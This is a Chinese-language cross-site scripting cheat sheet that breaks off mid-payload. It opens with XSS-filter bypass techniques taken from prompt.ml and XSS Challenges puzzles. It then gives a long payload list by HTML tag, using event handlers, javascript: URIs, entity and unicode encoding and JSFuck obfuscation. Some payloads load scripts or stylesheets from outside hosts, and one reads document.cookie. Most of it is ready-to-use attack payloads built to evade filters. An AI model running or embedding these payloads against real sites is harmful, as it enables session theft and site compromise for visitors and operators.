    <content type="text"><![CDATA[一、绕过 XSS Filter 的方法1.逃离 &quot;&quot; 的束缚※ 普通的闭合 有的并没有进行过滤，只需要简单的闭合即可逃离； ※ 利用反引号代替 条件：过滤掉 “”。在 IE 浏览器下，用 `` 代替 \” \”，以到达闭合的作用； ※ 利用换行的特性 详情见 prompt.ml 0x08 题目 2.&lt; 和 /&gt; 过滤类型的题目※ 利用事件触发 payload 虽然不能产生新的标签，但是可以在已经存在的标签（如svg、input、img、script等）内部添加 on+event 事件（onclick、onerror、onload、onmouseup、onmousedown等） 相关题目：xss challenges_0x06)、 ※ 利用题目中给出的函数进行绕过 可以根据代码中相关函数的特性进行绕过； 相关题目：prompt.ml_0x01) 3.on+event 的过滤※ 通过伪协议来完成payload 虽然不能通过 on+event 来完成 js 事件的出发，但是可以通过伪协议 javascript: 来构造。 相关题目：XSS challenges) 4.on+event = 的过滤※ 通过换行进行绕过 可以利用 js 事件与=不在同一行上，也能被成功解析的特性来绕过，举个例子： 123var a= 'hello xss';alert(a); 相关题目：prompt.ml_0x05) 5.对标识符/关键词/字符串进行过滤或者替换※ 利用过滤规则进行绕过 要利用好题目中给出的规则，来达到绕过的目的，一般是删除某些标识符：svg、 script 、alert等，我们可以利用双写的形式进行绕过：svsvgg、scriscriptpt、alealertrt的形式达到绕过的目的。 相关题目：xss challenges_0x0A) ※ 利用 script 的大小写不敏感的特性 有些题目会对 script 进行过滤（前提是区分大小写），这时我们可以利用 script 标签大小写不敏感的特性来绕过，如将script变为xscript，我们可以输入SCRipt。 相关题目：暂无 ※ 利用编码进行绕过 根据题目的规则，进行相应的HTML 编码、URI 编码和Javascript 编码)，其中对javascript: 进行实体编码来绕过的方法很有用。 相关题目：xss challenges_0x0B) 如果再对 ( 和 =进行过滤，那么又只能在&lt;script&gt;标签内部执行函数的话，还只能通过实体编码绕过，那么就需要用到一个标签 &lt;svg&gt;的特性) 相关题目：prompt.ml_0x02) 6.toUppercase() 的过滤※ 利用unicode或js隐式转换 二、各标签常见的 xss payload按照字母书写顺序进行排列 ◈ &lt;a&gt;标签123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051+++++++++++++++++ 十六进制编码实体 ++++++++++++++++++&lt;a href="javascript:alert(/xss/)"&gt;/xss/&lt;/a&gt; // javascript不区分大小写&lt;a href="&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2F;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2F;&amp;#x29;"&gt;/xss/&lt;/a&gt;&lt;a href="&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;%61%6c%65%72%74%28%2f%78%73%73%2f%29"&gt;/xss/&lt;/a&gt;&lt;a href="&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;\u0061\u006c\u0065\u0072\u0074('\u002f\u0078\u0073\u0073\u002f')"&gt;/xss/&lt;/a&gt;&lt;/body&gt;&lt;a onclick=alert(/xss/)&gt;/xss/&lt;/a&gt; // 十六进制编码不区分大小写 &lt;a href=" javascript:alert(1)"&gt;XSS&lt;/a&gt; // 协议之前允许使用字符\x01-\x20&lt;a href="javas cript:alert(1)"&gt;XSS&lt;/a&gt; // 协议中允许使用字符\x09（\t-&amp;Tab;），\x0a（\n-&amp;NewLine;），\x0d（\）&lt;a href="javascript:x='&amp;percnt;27-alert(1)-%27';"&gt;XSS&lt;/a&gt; // HTML实体和URL编码++++++++++++ 如果下一个字符不是a-f0-9，则不使用分号的十六进制编码 ++++++++++++&lt;a href="j&amp;#x61vascript:alert(1)"&gt;XSS&lt;/a&gt;&lt;a href="&amp;#x6aavascript:alert(1)"&gt;XSS&lt;/a&gt;&lt;a href="&amp;#x6a avascript:alert(1)"&gt;XSS&lt;/a&gt;++++++++++++++++++++HTML 实体++++++++++++++++++++++++++++++++&lt;a href="javascript&amp;colon;alert(1)"&gt;XSS&lt;/a&gt;&lt;a href="java&amp;Tab;script:alert(1)"&gt;XSS&lt;/a&gt;&lt;a href="java&amp;NewLine;script:alert(1)"&gt;XSS&lt;/a&gt;&lt;a href="javascript&amp;colon;alert&amp;lpar;1&amp;rpar;"&gt;XSS&lt;/a&gt;----------------------------------------------------&lt;a href="javascript:x='%27-alert(1)-%27';"&gt;XSS&lt;/a&gt; // 网址编码&lt;a href="javascript:x='&amp;percnt;27-alert(1)-%27';"&gt;XSS&lt;/a&gt; // HTML实体和URL编码&lt;a href="" onclick=eval(alert(/xss/))&gt;/xss/&lt;/a&gt; // 需要点击一下元素（Chrome、Firefox、IE、Safari)&lt;a id=x tabindex=1 onactivate=alert(1)&gt;&lt;/a&gt; // 激活元素时触发(IE)&lt;a id=x tabindex=1 onbeforeactivate=alert(1)&gt;&lt;/a&gt; //在激活元素之前触发（IE）&lt;a onblur=alert(1) tabindex=1 id=x&gt;&lt;/a&gt;&lt;input autofocus&gt; // 当元素失去焦点时触发（Chrome、IE、Safari）&lt;a id=x tabindex=1 onfocus=alert(1)&gt;/xss/&lt;/a&gt; // 当元素具有焦点时触发（Chrome、IE、Safari)&lt;a id=x tabindex=1 onfocusin=alert(1)&gt;&lt;/a&gt; // 当元素具有焦点时触发（Chrome、IE、Safari)&lt;a onbeforecopy="alert(1)" contenteditable&gt;test&lt;/a&gt; // 需要复制一段文字（Chrome、Firefox、IE、Safari)&lt;a onbeforecut="alert(1)" contenteditable&gt;test&lt;/a&gt; // 要求剪切一段文字（Chrome、Firefox、IE、Safari)&lt;a oncontextmenu="alert(1)"&gt;test&lt;/a&gt; // 右键单击以显示上下文菜单时触发（Chrome、Firefox、IE、Safari)&lt;a oncopy="alert(1)" contenteditable&gt;test&lt;/a&gt; // 需要复制一段文字（Chrome、Firefox、IE、Safari)&lt;a oncut="alert(1)" contenteditable&gt;test&lt;/a&gt; // 要求剪切一段文字（Chrome、Firefox、IE、Safari)&lt;a onpaste="alert(1)" contenteditable&gt;test&lt;/a&gt; // 需要粘贴一段文字（Chrome、Firefox、IE、Safari)&lt;a ondblclick="alert(1)"&gt;test&lt;/a&gt; // 双击元素时触发（Chrome、Firefox、IE、Safari)&lt;a draggable="true" ondrag="alert(1)"&gt;test&lt;/a&gt; // 触发拖动元素（Chrome、Firefox、IE、Safari)&lt;a draggable="true" ondragend="alert(1)"&gt;test&lt;/a&gt; // 触发拖动已在元素上完成（Chrome、Firefox、IE、Safari)&lt;a draggable="true" ondragenter="alert(1)"&gt;test&lt;/a&gt; // 需要鼠标拖动（Chrome、Firefox、IE、Safari)&lt;a draggable="true" ondragleave="alert(1)"&gt;test&lt;/a&gt; // 同上&lt;a onkeydown="alert(1)" contenteditable&gt;test&lt;/a&gt; // 按下键时触发（Chrome、Firefox、IE、Safari)&lt;a onkeypress="alert(1)" contenteditable&gt;test&lt;/a&gt; // 同上&lt;a onkeyup="alert(1)" contenteditable&gt;test&lt;/a&gt; // 释放按键时触发（Chrome、Firefox、IE、Safari)&lt;a onmousedown="alert(1)"&gt;test&lt;/a&gt; // 按下鼠标时触发（Chrome、Firefox、IE、Safari)&lt;a onmouseenter="alert(1)"&gt;test&lt;/a&gt; // 当鼠标悬停在元素上时触发（Chrome、Firefox、IE、Safari)&lt;a onmouseleave="alert(1)"&gt;test&lt;/a&gt; // 当鼠标移离元素时触发（Chrome、Firefox、IE、Safari)&lt;a onmousemove="alert(1)"&gt;test&lt;/a&gt; // 需要鼠标移动（Chrome、Firefox、IE、Safari)&lt;a onmouseout="alert(1)"&gt;test&lt;/a&gt; // 当鼠标移离元素时触发（Chrome、Firefox、IE、Safari)&lt;a onmouseover="alert(1)"&gt;test&lt;/a&gt; // 需要将鼠标悬停在元素上（Chrome、Firefox、IE、Safari)&lt;a onmouseup="alert(1)"&gt;test&lt;/a&gt; // 释放鼠标按钮时触发（Chrome、Firefox、IE、Safari) ◈ &lt;audio&gt; 标签123456789101112&lt;audio src=x onerror=alert(/xss/)&gt; // 资源加载失败或导致错误时触发（Chrome、Firefox、IE、Safari)&lt;audio oncanplay=alert(1)&gt;&lt;source src="horse.ogg" type="audio/wav"&gt;&lt;/audio&gt; // 如果资源可以播放则触发（Chrome、Firefox、IE、Safari) &lt;video&gt; 标签也可以&lt;audio controls autoplay onended=alert(1)&gt;&lt;source src="mov_bbb.mp4" type="audio/wav"&gt;&lt;/audio&gt; // 资源播放完毕时触发（Chrome、Firefox、IE、Safari)&lt;audio onloadeddata=alert(1) controls&gt;&lt;source src="horse.mp3" type="audio/mp3"&gt;&lt;/audio&gt; // 加载第一帧时触发（Chrome、Firefox、IE、Safari)&lt;audio autoplay onloadedmetadata=alert(1)&gt; &lt;source src="horse.mp3" type="audio/mp3"&gt;&lt;/audio&gt; // 加载元数据时触发（Chrome、Firefox、IE、Safari)&lt;audio autoplay onplay=alert(1)&gt;&lt;source src="horse.mp3" type="audio/mp3"&gt;&lt;/audio&gt; // 播放资源时触发（Chrome、Firefox、IE、Safari)&lt;audio autoplay onplaying=alert(1) controls&gt;&lt;source src="horse.mp3" type="audio/mp3"&gt;&lt;/audio&gt; // 触发资源正在播放（Chrome、Firefox、IE、Safari)&lt;audio controls autoplay ontimeupdate=alert(1)&gt;&lt;source src="validaudio.wav" type="audio/wav"&gt;&lt;/audio&gt; // 更改时间轴时触发（Chrome、Firefox、IE、Safari)&lt;audio autoplay controls onpause=alert(1)&gt;&lt;source src="movie.mp4" type="video/mp4"&gt;&lt;/audio&gt; // 需要点击元素才能暂停（Chrome、Firefox、IE、Safari)（video 同理）&lt;audio autoplay controls onseeked=alert(1)&gt;&lt;source src="movie.mp4" type="video/mp4"&gt;&lt;/audio&gt; // 需要点击元素时间轴（Chrome、Firefox、IE、Safari)&lt;audio autoplay controls onseeking=alert(1)&gt;&lt;source src="validaudio.wav" type="audio/wav"&gt;&lt;/audio&gt; // 同上&lt;audio autoplay controls onvolumechange=alert(1)&gt;&lt;source src="movie.mp4" type="video/mp4"&gt;&lt;/audio&gt; // 需要调节音量（Chrome、Firefox、IE、Safari) ◈ &lt;body&gt; 标签12345678910111213&lt;body/onload=alert(/xss/)&gt;&lt;body onafterprint=alert(1)&gt; // 页面打印后触发（Chrome、Firefox、IE)&lt;body onbeforeprint=alert(1)&gt; // 在页面打印前触发（Chrome、Firefox、IE)body&#123;background-image:url(javascript:alert("xss"))&#125; //在CSS代码中加入javascript和vbscript脚本body&#123;xss:\0065xpression(alert('xss'))&#125;'//将e转换为\0065body&#123;background-image:\0075\0072\006c…&#125;'将url全转为16进制&lt;body onhashchange="alert(1)"&gt; // 如果哈希值更改，则触发（Chrome、Firefox、IE、Safari)&lt;body onmessage=alert(1)&gt; // 当从postMessage调用接收到消息事件时触发（Chrome、Firefox、IE、Safari)&lt;body onpageshow=alert(1)&gt; // 显示页面时触发（Chrome、IE、Safari)&lt;body onpopstate=alert(1)&gt; // 历史记录更改时触发（Chrome、Firefox、IE、Safari)&lt;body onresize="alert(1)"&gt; // 调整窗口大小时触发（Chrome、Firefox、IE、Safari)&lt;body onscroll=alert(1)&gt;&lt;div style=height:1000px&gt;&lt;/div&gt;&lt;div id=x&gt;&lt;/div&gt; // 页面滚动时触发（Chrome、Firefox、IE、Safari)&lt;body onunhandledrejection=alert(1)&gt;&lt;script&gt;fetch('//xyz')&lt;/script&gt; // 未履行承诺时触发（Firefox) ◈ &lt;button&gt; 标签123&lt;button/onclick=alert(/xss/)&gt;/xss/&lt;/button&gt;&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;M //需要交互&lt;button onfocus=alert(1) autofocus&gt; // 不需要交互 ◈ &lt;details&gt; 标签1&lt;details ontoggle=alert(1) open&gt;test&lt;/details&gt; // 展开详细信息标签时触发（Chrome、Firefox、IE、Safari) ◈ &lt;div&gt; 标签12345&lt;div/onmouseover='alert(1)'&gt;X&lt;div STYLE="background-image: url(javascript:alert('XSS'))"&gt;&lt;div STYLE="behaviour: url('http://www.how-to-hack.org/exploit.html');"&gt;&lt;div STYLE="width: expression(alert('XSS'));"&gt;&lt;div draggable="true" contenteditable&gt;drag me&lt;/div&gt;&lt;a ondragover=alert(1) contenteditable&gt;drop here&lt;/a&gt; // 触发删除可拖动元素（Chrome、Firefox、IE、Safari) ◈ &lt;embed&gt; 标签1&lt;embed src=&quot;javascript:alert(1)&quot;&gt; // 使用JavaScript协议嵌入src属性Firefox ◈ &lt;form&gt; 标签123456789101112&lt;form action="Javascript:alert(1)"&gt;&lt;input type=submit/ &gt;&lt;form onsubmit=alert(/xss/)&gt;&lt;button&gt;/xss/&lt;/button&gt;&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME&lt;/button&gt;&lt;form&gt;&lt;a href="javascript:\u0061lert(1)"&gt;/xss/&lt;/a&gt;&lt;form&gt;&lt;input oninvalid=alert(1) required&gt;&lt;input type=submit&gt; // 需要具有不满足其约束的元素（例如必填属性）的表单提交。（Chrome、Firefox、IE、Safari)&lt;form onreset=alert(1)&gt;&lt;input type=reset&gt; // 需要点击触发（Chrome、Firefox、IE、Safari)&lt;form&gt;&lt;input type=search onsearch=alert(1) value="Hit return" autofocus&gt; // 提交表单并且输入具有搜索的type属性时触发（Chrome）&lt;form onsubmit=alert(1)&gt;&lt;input type=submit&gt; // 需要提交表单（Chrome、Firefox、IE、Safari)&lt;form&gt;&lt;button formaction=javascript:alert(1)&gt;XSS // 按钮和动作&lt;form&gt;&lt;input type=submit formaction=javascript:alert(1) value=XSS&gt; // 输入和形式&lt;form action=javascript:alert(1)&gt;&lt;input type=submit value=XSS&gt; // 形式与行动&lt;form action="javascript:alert(1)"&gt;&lt;input type=submit id=x&gt;&lt;/form&gt;&lt;label for=x&gt;XSS&lt;/label&gt; // 在页面上的任何位置（甚至在表单外部）单击提交元素 ◈ &lt;img&gt; 标签1234567891011&lt;img src=javascript:alert("xss")&gt;&lt;ımg src=javascript:alert("xss")&gt; // toUpperCase 函数将 ı 解码为 I&lt;img/src/onerror=alert(1)&gt; //只在chrome下有效&lt;IMG SRC=# onerror=alert(String.fromCharCode(88,83,83))&gt;&lt;img src="https://upload-images.jianshu.io/upload_images/2836722-144777dab221babc.png?imageMogr2/auto-orient/strip|imageView2/2/w/537/format/webp" onload=alert(/xss/)&gt;&lt;img src='1' onerror\x00=alert(0) /&gt; // 绕过 onxxx= 过滤通过空字节/垂直标签&lt;img/src='1'/onerror/=alert(0) /&gt; // 绕过空格过滤&lt;img src="1" onerror=location="javascript:alert%281%29"&gt; // location&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"&gt; // IE 浏览器&lt;image src=https://www.runoob.com/images/compatible_firefox.gif onloadend=alert(1)&gt; // 当元素（图片）完成加载时触发（Firefox)&lt;image src=https://www.runoob.com/images/compatible_firefox.gif onloadstart=alert(1)&gt; // 当元素（图片）开始加载时触发（Firefox) ◈ &lt;iframe&gt; 标签1234567891011&lt;iframe src="javascript:%61%6c%65%72%74%28%31%29"&gt;&lt;/iframe&gt;&lt;iframe/onload=alert(/xss/)&gt;&lt;/iframe&gt;&lt;IFRAME SRC="javascript:alert(14);"&gt;&lt;/IFRAME&gt;&lt;IFRAME SRC=# onmouseover="alert(document.cookie)"&gt;&lt;/IFRAME&gt;&lt;iframe/src="data:text/html,&lt;svg onload=alert(1)&gt;"/&gt;&lt;iframe src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;/iframe&gt;&lt;iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"&gt;&lt;/iframe&gt;⭐ &lt;iframe src=j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;%28&amp;Tab;1&amp;Tab;%29&gt;&lt;/iframe&gt; // &amp;Tab;为tab字符&lt;iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"&gt;&lt;/iframe&gt; // 使用srcdoc属性，只有 Chrome 和 Safari 6 支持 &lt;iframe&gt; 标签的 srcdoc 属性。&lt;iframe srcdoc="&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;"&gt;&lt;/iframe&gt; // Chrome 下 srcdoc 属性&lt;iframe src="data:text/html,&lt;img src=1 onerror=alert(1)&gt;"&gt; // 随着现代浏览器使用空来源，iframe数据网址不再起作用 ◈ &lt;input&gt; 标签12345678&lt;input/type=image src=# onerror=alert(/xss/)/&gt;&lt;input/onclick/onmouseup/onmousedown/onchange=alert(/xss/)/&gt;&lt;input onauxclick=alert(1)&gt; // 右键单击或使用鼠标中键时触发（Chrome、Firefox)&lt;input onchange=alert(1) value=xss&gt; // 需要属性值的变化（Chrome、Firefox、IE、Safari)（写完之后鼠标点击别处时会触发）&lt;input oninput=alert(1) value=xss&gt; // 需要作为价值的变化（Chrome、Firefox、IE、Safari)（只要写入就会出发）&lt;input onselect=alert(1) value="XSS" autofocus&gt; // 需要选择文字（Chrome、Firefox、IE、Safari)&lt;input type="hidden" accesskey="X" onclick="alert(1)"&gt; // 隐藏的输入：访问键属性可以在通常无法利用的元素上启用XSS(Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X) ◈ &lt;isindex&gt; 标签(需要加强)1&lt;isindex type=submit formaction=javascript:alert(1)&gt; // Isindex和formaction（IE） ◈ &lt;link&gt; 标签(需要加强)123&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"&gt;&lt;LINK REL="stylesheet" HREF="http://xss.rocks/xss.css"&gt;&lt;link rel="canonical" accesskey="X" onclick="alert(1)" /&gt; // 链接元素：访问键属性可以在通常无法利用的元素上启用XSS(Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)（Firefox） ◈ &lt;mate&gt; 标签(需要加强)1&lt;META HTTP-EQUIV="Link" Content="&lt;http://xss.rocks/xss.css&gt;; REL=stylesheet"&gt; ◈ &lt;marquee&gt; 标签12&lt;math&gt;&lt;x href="javascript:alert(1)"&gt;blah // MathML使任何标签都可点击 Firefox&lt;meta http-equiv="refresh" content="0; url=//portswigger-labs.net"&gt; // 重定向到其他域 ◈ &lt;marquee&gt; 标签123&lt;marquee width=1 loop=1 onbounce=alert(1)&gt;XSS&lt;/marquee&gt; // 选框弹跳时触发（好像都实现不了）&lt;marquee width=1 loop=1 onfinish=alert(1)&gt;XSS&lt;/marquee&gt; // 选框完成时触发（Firefox、IE)&lt;marquee onstart=alert(1)&gt;XSS&lt;/marquee&gt; // 选框开始时触发（Firefox、IE) ◈ &lt;object&gt; 标签12=============================== 通讯协议 ==============================&lt;object data="javascript:alert(1)"&gt; // 具有JavaScript协议的对象data属性(Firefox) ◈ &lt;p&gt; 标签1&lt;p/onmouseover=javascript:alert(1); &gt;M&lt;/p&gt; // 如果发现变量输出在p标签中，只要能跳出""就足够了 ◈ &lt;script&gt; 标签1234567891011121314151617181920212223242526272829303132333435&lt;script&gt;alert(1)&lt;/script&gt;&lt;ſcript&gt;alert(1)&lt;/ſcript&gt; // toUpperCase 函数将 ſ 解码为 S&lt;sCrIpt&gt;alert(1)&lt;/ScRipt&gt; // 大小写绕过标签黑名单&lt;script src="https://马赛克/payload.js"&gt;&lt;/script&gt;&lt;script&gt;window['alert'](document['domain'])&lt;/script&gt; // 绕过点（.）的限制&lt;script src=data:text/javascript,alert(/xss/)&gt;&lt;/script&gt; // 脚本src中的数据协议&lt;script src=data:text/javascript;base64,YWxlcnQoMSk=&gt;&lt;/script&gt; // 带有base64的脚本src中的数据协议&lt;svg&gt;&lt;script href="data:text/javascript,alert(1)" /&gt; // SVG脚本href属性，（IE、Firefox）无需关闭脚本标签,（Google）需要关闭&lt;script src=&amp;#100&amp;#97&amp;#116&amp;#97:text/javascript,alert(/xss/)&gt;&lt;/script&gt;&lt;script&gt;import('data:text/javascript,alert(1)')&lt;/script&gt; // 带有数据URL的导入语句&lt;script&gt;alert(String.fromCharCode(49,49))&lt;/script&gt;&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(1)&lt;/script&gt;&lt;script&gt;\u0061lert(1)&lt;/script&gt; // Unicode转义&lt;script&gt;\u&#123;61&#125;lert(1)&lt;/script&gt; // Unicode转义ES6样式&lt;script&gt;\u&#123;0000000061&#125;lert(1)&lt;/script&gt; // Unicode转义ES6样式零填充&lt;script&gt;eval('\x61lert(1)')&lt;/script&gt; // 十六进制编码JavaScript转义&lt;script&gt;eval('\141lert(1)')&lt;/script&gt; // 八进制编码&lt;script&gt;eval('alert(\061)')&lt;/script&gt; // 八进制编码&lt;script&gt;eval('alert(\61)')&lt;/script&gt; // 八进制编码&lt;script&gt;alert`1`&lt;/script&gt; // 使用反引号绕过&lt;script&gt;$=~[];$=&#123;___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:(&#123;&#125;+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:(&#123;&#125;+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$&#125;;$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();&lt;/script&gt;&lt;script&gt;(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()&lt;/script&gt;===============================限制字符====================================&lt;script&gt;onerror=alert;throw 1&lt;/script&gt; // 无括号，使用异常处理&lt;script&gt;&#123;onerror=alert&#125;throw 1&lt;/script&gt; // 无括号，无分号，使用异常处理&lt;script&gt;throw onerror=alert,1&lt;/script&gt; // 无括号的异常处理，没有使用表达式的半冒号&lt;script&gt;throw onerror=eval,'=alert\x281\x29'&lt;/script&gt; // 无括号异常处理和evil&lt;script&gt;&#123;onerror=eval&#125;throw&#123;lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'&#125;&lt;/script&gt; // 无括号，在Firefox上使用异常处理和evil&lt;script&gt;'alert\x281\x29'instanceof&#123;[Symbol.hasInstance]:eval&#125;&lt;/script&gt; // 无括号，使用ES6 hasInstance和instanceof与eval&lt;script&gt;'alert\x281\x29'instanceof&#123;[Symbol['hasInstance']]:eval&#125;&lt;/script&gt; // 无括号，使用ES6的hasInstance和instanceof以及eval&lt;script&gt;location='javascript:alert\x281\x29'&lt;/script&gt; // 无括号，使用位置重定向&lt;script&gt;location=name&lt;/script&gt; // 无字符串，使用位置没有括号重定向&lt;script&gt;alert`1`&lt;/script&gt; // 无括号，使用模板字符串 ◈ &lt;style&gt; 标签(需要加强)12345678910&lt;STYLE&gt;@import'http://xss.rocks/xss.css';&lt;/STYLE&gt;&lt;STYLE&gt;BODY&#123;-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")&#125;&lt;/STYLE&gt;&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE&gt;&lt;STYLE TYPE="text/javascript"&gt;alert('XSS');&lt;/STYLE&gt;&lt;STYLE type="text/css"&gt;BODY&#123;background:url("javascript:alert('XSS')")&#125;&lt;/STYLE&gt;&lt;style&gt;@keyframes x&#123;from &#123;left:0;&#125;to &#123;left: 1000px;&#125;&#125;:target &#123;animation:10s ease-in-out 0s 1 x;&#125;&lt;/style&gt;&lt;a id=x style="position:absolute;" onanimationcancel="alert(1)"&gt;&lt;/a&gt; //CSS动画取消时触发(Firefox)&lt;style&gt;@keyframes x&#123;from &#123;left:0;&#125;to &#123;left: 1000px;&#125;&#125;:target &#123;animation:10s ease-in-out 0s 1 